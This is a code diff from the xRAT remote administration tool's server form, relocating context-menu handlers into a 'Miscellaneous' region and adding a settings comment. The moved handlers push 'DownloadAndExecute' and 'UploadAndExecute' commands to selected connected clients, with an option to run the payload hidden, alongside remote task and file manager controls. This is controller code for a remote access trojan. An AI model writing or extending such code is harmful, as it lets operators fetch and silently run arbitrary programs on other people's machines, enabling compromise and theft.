@@ -21,6 +21,7 @@ namespace xRAT_2.Forms
             XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
             XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
             XMLSettings.Password = XMLSettings.ReadValue("Password");
+            // fallback for old settings
             XMLSettings.UseUPnP = bool.Parse((!string.IsNullOrEmpty(XMLSettings.ReadValue("UseUPnP"))) ? XMLSettings.ReadValue("UseUPnP") : "False");
 
             if (bool.Parse(XMLSettings.ReadValue("ShowToU")))
@@ -310,24 +311,6 @@ namespace xRAT_2.Forms
                 }
             }
             
-            private void ctxtDownloadAndExecute_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    using (var frm = new frmDownloadAndExecute(lstClients.SelectedItems.Count))
-                    {
-                        if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
-                        {
-                            foreach (ListViewItem lvi in lstClients.SelectedItems)
-                            {
-                                Client c = (Client)lvi.Tag;
-                                new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL, DownloadAndExecute.RunHidden).Execute(c);
-                            }
-                        }
-                    }
-                }
-            }
-            
             private void ctxtTaskManager_Click(object sender, EventArgs e)
             {
                 if (lstClients.SelectedItems.Count != 0)
@@ -355,24 +338,6 @@ namespace xRAT_2.Forms
                     }
                     frmFileManager frmFM = new frmFileManager(c);
                     frmFM.Show();
-                }
-            }
-            
-            private void ctxtUploadAndExecute_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    using (var frm = new frmUploadAndExecute(lstClients.SelectedItems.Count))
-                    {
-                        if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
-                        {
-                            foreach (ListViewItem lvi in lstClients.SelectedItems)
-                            {
-                                Client c = (Client)lvi.Tag;
-                                new Core.Packets.ServerPackets.UploadAndExecute(UploadAndExecute.File, UploadAndExecute.FileName, UploadAndExecute.RunHidden).Execute(c);
-                            }
-                        }
-                    }
                 }
             }
             
@@ -454,6 +419,42 @@ namespace xRAT_2.Forms
             #endregion
             
             #region "Miscellaneous"
+            private void ctxtDownloadAndExecute_Click(object sender, EventArgs e)
+            {
+                if (lstClients.SelectedItems.Count != 0)
+                {
+                    using (var frm = new frmDownloadAndExecute(lstClients.SelectedItems.Count))
+                    {
+                        if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                        {
+                            foreach (ListViewItem lvi in lstClients.SelectedItems)
+                            {
+                                Client c = (Client)lvi.Tag;
+                                new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL, DownloadAndExecute.RunHidden).Execute(c);
+                            }
+                        }
+                    }
+                }
+            }
+            
+            private void ctxtUploadAndExecute_Click(object sender, EventArgs e)
+            {
+                if (lstClients.SelectedItems.Count != 0)
+                {
+                    using (var frm = new frmUploadAndExecute(lstClients.SelectedItems.Count))
+                    {
+                        if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                        {
+                            foreach (ListViewItem lvi in lstClients.SelectedItems)
+                            {
+                                Client c = (Client)lvi.Tag;
+                                new Core.Packets.ServerPackets.UploadAndExecute(UploadAndExecute.File, UploadAndExecute.FileName, UploadAndExecute.RunHidden).Execute(c);
+                            }
+                        }
+                    }
+                }
+            }
+            
             private void ctxtVisitWebsite_Click(object sender, EventArgs e)
             {
                 if (lstClients.SelectedItems.Count != 0)
